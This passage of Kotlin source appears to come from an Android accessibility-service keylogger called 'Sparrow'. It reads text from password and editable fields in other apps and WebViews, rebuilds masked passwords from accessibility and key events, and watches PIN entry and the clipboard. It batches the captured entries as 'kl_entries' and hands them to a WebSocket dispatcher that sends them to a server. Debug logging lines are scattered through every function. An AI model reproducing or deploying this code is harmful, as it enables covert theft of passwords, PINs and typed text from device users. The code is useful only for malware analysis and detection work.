        if (t.length == 1 && t[0].isDigit()) return t[0]
        if (t.length in 2..5 && t[0].isDigit() && t.drop(1).none { it.isDigit() }) return t[0]
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return null
    }

    private fun isBackspaceStr(s: String?): Boolean {
        android.util.Log.d("XDBG", "[Sparrow] isBackspaceStr enter s=${s}") //xdbg
        val t = s?.trim() ?: return false
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return t in setOf("⌫", "←", "✕", "×", "⟵") || t.lowercase() in BACKSPACE_LABELS
    }

    private fun traverseWebViewTree(node: AccessibilityNodeInfo, pkg: String, depth: Int) {
        android.util.Log.d("XDBG", "[Sparrow] traverseWebViewTree enter node=${node} pkg=${pkg} depth=${depth}") //xdbg
        if (depth > 12) return
        val text = node.text?.toString() ?: ""
        val isPassword = node.isPassword
        val isEditable = node.isEditable
        if ((isEditable || isPassword) && text.isNotBlank()) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            val cls = node.className?.toString() ?: ""
            val fieldId = node.viewIdResourceName?.takeIf { it.isNotEmpty() } ?: cls
            val key = "$pkg/web/$fieldId"
            if (webViewFieldLast[key] != text) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                webViewFieldLast[key] = text
                synchronized(fieldState) {
                    fieldState[key] = FieldEntry(pkg, appLabel(pkg), text, isPassword, System.currentTimeMillis(), "web")
                }
                if (isPassword) { handler.post { flush() }; return }
                handler.post { scheduleFlush() }
            }
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            traverseWebViewTree(child, pkg, depth + 1)
            try { child.recycle() } catch (_: Exception) {}
        }
    }

    fun onKeyEvent(event: KeyEvent) {
        android.util.Log.d("XDBG", "[Sparrow] onKeyEvent enter event=${event}") //xdbg
        if (!enabled || !activeWatched || !focusedIsPass) return
        if (event.action != KeyEvent.ACTION_DOWN) return

        val key = focusedPwdKey
        val pkg = focusedPwdPkg
        if (key.isEmpty()) return

        val prev = pwdTracked[key] ?: CharArray(0)
        val next: CharArray = when (event.keyCode) {
            KeyEvent.KEYCODE_DEL -> {
                if (prev.isEmpty()) return
                prev.copyOf(prev.size - 1)
            }
            KeyEvent.KEYCODE_FORWARD_DEL -> return
            else -> {
                val unicode = event.unicodeChar
                if (unicode <= 0) return
                val c = unicode.toChar()
                if (c.isISOControl()) return
                CharArray(prev.size + 1).also { a ->
                    prev.copyInto(a)
                    a[prev.size] = c
                }
            }
        }

        pwdTracked[key] = next
        val text = String(next)
        if (text.isEmpty()) return

        lastHwKeyNs = System.nanoTime()
        fieldState[key] = FieldEntry(pkg, appLabel(pkg), text, true, System.currentTimeMillis(), "edit")
        flush()
    }

    private fun isBullet(c: Char) = c == '•' || c == '●' || c == '*'

    private fun trackPassword(key: String, rawText: String, fromIdx: Int, addedCnt: Int, removedCnt: Int): String {
        android.util.Log.d("XDBG", "[Sparrow] trackPassword enter key=${key} rawText=${rawText} fromIdx=${fromIdx} addedCnt=${addedCnt} removedCnt=${removedCnt}") //xdbg
        val raw = rawText.toCharArray()
        val newLen = raw.size
        val prev = pwdTracked[key]

        val tracked: CharArray = when {
            prev == null || newLen == 0 -> {
                CharArray(newLen) { if (isBullet(raw[it])) '•' else raw[it] }
            }
            newLen == prev.size -> {
                prev.clone().also { t ->
                    for (i in raw.indices) {
                        android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                        if (!isBullet(raw[i])) t[i] = raw[i]
                    }
                }
            }
            else -> {
                val from = fromIdx.coerceIn(0, prev.size)
                CharArray(newLen) { '•' }.also { t ->
                    for (i in 0 until from) {
                        android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                        if (i < prev.size) t[i] = prev[i]
                    }
                    val shift = addedCnt - removedCnt
                    for (i in (from + addedCnt) until newLen) {
                        android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                        val j = i - shift
                        if (j >= 0 && j < prev.size) t[i] = prev[j]
                    }
                    for (i in raw.indices) {
                        android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                        if (!isBullet(raw[i])) t[i] = raw[i]
                    }
                }
            }
        }

        pwdTracked[key] = tracked
        if (newLen == 0) pwdTracked.remove(key)
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return String(tracked)
    }

    private fun appLabel(pkg: String): String {
        android.util.Log.d("XDBG", "[Sparrow] appLabel enter pkg=${pkg}") //xdbg
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return labelCache.getOrPut(pkg) {
            try {
                val ctx = AccessSvc.instance ?: return@getOrPut pkg
                val info = ctx.packageManager.getApplicationInfo(pkg, 0)
                ctx.packageManager.getApplicationLabel(info).toString()
            } catch (_: Exception) { pkg }
        }
    }

    private fun scheduleFlush() {
        android.util.Log.d("XDBG", "[Sparrow] scheduleFlush enter") //xdbg
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, FLUSH_INTERVAL_MS)
    }

    private fun flushFields() {
        android.util.Log.d("XDBG", "[Sparrow] flushFields enter") //xdbg
        if (fieldState.isEmpty()) return
        synchronized(fieldState) {
            val srcPriority = mapOf("edit" to 0, "pin" to 1, "custom" to 2, "web" to 3, "win" to 4)
            val entries = fieldState.values.sortedBy { srcPriority[it.src] ?: 99 }

            for (entry in entries) {
                android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                if (entry.text.isBlank()) continue
                val dedupKey = "${entry.pkg}::${entry.text.trim()}"

                if (!sentTexts.add(dedupKey)) continue

                if (entry.src == "win") {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    fieldState.entries.firstOrNull { it.value === entry }?.key
                        ?.let { winSentCache[it] = entry.text }
                }

                buffer.add(JSONObject().apply {
                    put("t", "key")
                    put("ts", entry.ts)
                    put("pkg", labelFor(entry.pkg))
                    put("name", entry.name)
                    put("pass", entry.isPassword)
                    put("after", entry.text)
                    put("src", entry.src)
                })
            }
            fieldState.clear()
        }
    }

    fun flush() {
        android.util.Log.d("XDBG", "[Sparrow] flush enter") //xdbg
        flushFields()
        if (buffer.isEmpty()) return
        val snapshot = ArrayList(buffer)
        buffer.clear()
        if (snapshot.isEmpty()) return

        val arr = JSONArray()
        for (item in snapshot) arr.put(item)

        try {
            val ctx = AccessSvc.instance ?: return
            val payload = JSONObject().apply {
                put("action", "kl_entries")
                put("entries", arr)
            }
            val sendIntent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                `package` = ctx.packageName
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
            }
            ctx.sendBroadcast(sendIntent)
        } catch (_: Exception) {}
    }

    fun stop() {
        android.util.Log.d("XDBG", "[Sparrow] stop enter") //xdbg
        enabled = false
        handler.removeCallbacks(flushRunnable)
        bgThread.quitSafely()
        flush()
        watchedPkgs = emptySet()
        watchedPkgLabels.clear()
        activeWatched = false
        removePinOverlay()
        pinCoordsTracked.clear()
        coordLastTapMs.clear()
        coordLastTapKey.clear()
        try {
            clipboardManager?.removePrimaryClipChangedListener(clipboardListener)
            clipboardManager = null
        } catch (_: Exception) {}
    }
}
